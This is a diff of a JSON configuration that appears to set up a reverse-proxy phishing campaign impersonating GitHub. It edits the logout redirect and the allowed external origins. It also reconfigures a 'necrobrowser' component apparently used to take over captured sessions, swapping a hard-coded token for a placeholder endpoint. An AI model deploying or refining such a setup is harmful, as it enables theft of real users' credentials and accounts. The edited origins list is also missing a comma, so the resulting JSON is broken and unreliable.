@@ -82,7 +82,7 @@
     "drop": [
       {
         "url": "/logout",
-        "redirectTo": "https://google.com"
+        "redirectTo": "https://github.com"
       }
     ],
     "log": {
@@ -105,45 +105,18 @@
     "externalOrigins": [
       "*.githubassets.com",
       "*.githubusercontent.com",
-      "github-cloud.s3.amazonaws.com",
-      "www.w3.org",
+      "*.github.io",
       "*.githubapp.com",
+      "github-cloud.s3.amazonaws.com",
       "octocaptcha.com",
-      "stats.g.doubleclick.net",
-      "www.google.com",
-      "www.google-analytics.com",
-      "www.youtube.com",
-      "raw.githubusercontent.com",
-      "fonts.googleapis.com",
-      "github.community",
-      "youtu.be",
-      "opensource.guide",
-      "mindprod.com",
-      "atom.io",
-      "electron.atom.io",
-      "githubstatus.com",
-      "github.blog",
-      "twitter.com",
-      "www.facebook.com",
-      "www.linkedin.com",
-      "globalgamejam.org",
-      "git-merge.com",
-      "www.ibm.com",
-      "icgj19.gameconf.org",
-      "githubsatellite.com",
-      "probot.github.io",
-      "githubcampus.expert",
-      "opensourcefriday.com",
-      "githubengineering.com",
-      "jekyllrb.com"
+      "stats.g.doubleclick.net"
+      "githubstatus.com"
     ]
   },
   "necrobrowser": {
     "enabled": true,
-    "endpoint": "http://127.0.0.1:8888",
-    "token": "ada9f7b8-6e6c-4884-b2a3-ea757c1eb617",
-    "profile": "github",
-    "keywords": null
+    "endpoint": "http://necrobrowser.url/xyz",
+    "profile": "./config/instrument.github.necro"
   },
   "staticServer": {
     "enabled": false,
